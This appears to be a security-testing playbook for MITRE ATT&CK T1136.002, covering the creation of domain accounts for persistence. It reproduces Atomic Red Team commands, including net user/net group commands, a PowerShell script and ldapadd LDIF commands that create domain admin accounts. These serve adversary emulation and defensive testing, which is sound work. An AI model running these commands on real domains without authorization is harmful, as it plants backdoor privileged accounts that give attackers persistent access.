---
name: "T1136.002_domain-account"
description: "Adversaries may create a domain account to maintain access to victim systems."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1136.002
  - persistence
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1136.002"
tactic: "persistence"
all_tactics:
  - persistence
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1136/002"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1136
  - T1136.001
  - T1136.003
prerequisites:
  - T1136
severity_boost:
  T1136: "Chain with T1136 for deeper attack path"
  T1136.001: "Chain with T1136.001 for deeper attack path"
  T1136.003: "Chain with T1136.003 for deeper attack path"
---

# T1136.002 Domain Account

> **Sub-technique of:** T1136

## High-Level Description

Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

## Kill Chain Phase

- Persistence (TA0003)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Domain Account technique is applicable to target environment
- [ ] Check Linux systems for indicators of Domain Account
- [ ] Check macOS systems for indicators of Domain Account
- [ ] Check Windows systems for indicators of Domain Account
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Create a new Windows domain admin user

Creates a new domain admin user in a command prompt.

**Supported Platforms:** windows

```cmd
net user "#{username}" "#{password}" /add /domain
net group "#{group}" "#{username}" /add /domain
```

### Atomic Test 2: Create a new account similar to ANONYMOUS LOGON

Create a new account similar to ANONYMOUS LOGON in a command prompt.

**Supported Platforms:** windows

```cmd
net user "#{username}" "#{password}" /add /domain
```

### Atomic Test 3: Create a new Domain Account using PowerShell

Creates a new Domain User using the credentials of the Current User

**Supported Platforms:** windows

```powershell
$SamAccountName = '#{username}'
$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
$User.SamAccountName = $SamAccountName
$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
$User.SetPassword($TempCred.GetNetworkCredential().Password)
$User.Enabled = $True
$User.PasswordNotRequired = $False
$User.DisplayName = $SamAccountName
$User.Save()
$User
```

### Atomic Test 4: Active Directory Create Admin Account

Use Admin Credentials to Create A Domain Admin Account

**Supported Platforms:** linux

```bash
echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
```

**Dependencies:**
- Packages sssd-ad sssd-tools realmd adcli installed and realm available

### Atomic Test 5: Active Directory Create User Account (Non-elevated)

Use Admin Credentials to Create A Normal Account (as means of entry)

**Supported Platforms:** linux

```bash
echo "dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
```

**Dependencies:**
- Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Domain Account by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1136.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1032 Multi-factor Authentication
Use multi-factor authentication for user and privileged accounts.

### M1028 Operating System Configuration
Protect domain controllers by ensuring proper security configuration for critical servers.

### M1030 Network Segmentation
Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.

### M1026 Privileged Account Management
Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.


## Detection

### T1136.002 Detection Strategy - Domain Account Creation Across Platforms


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Domain Account technique applicable | High | Persistence |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-276 | Incorrect Default Permissions |


## References

- [Microsoft User Creation Event](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720)
- [Savill 1999](https://web.archive.org/web/20150511162820/http://windowsitpro.com/windows/netexe-reference)
- [Atomic Red Team - T1136.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1136.002)
- [MITRE ATT&CK - T1136.002](https://attack.mitre.org/techniques/T1136/002)
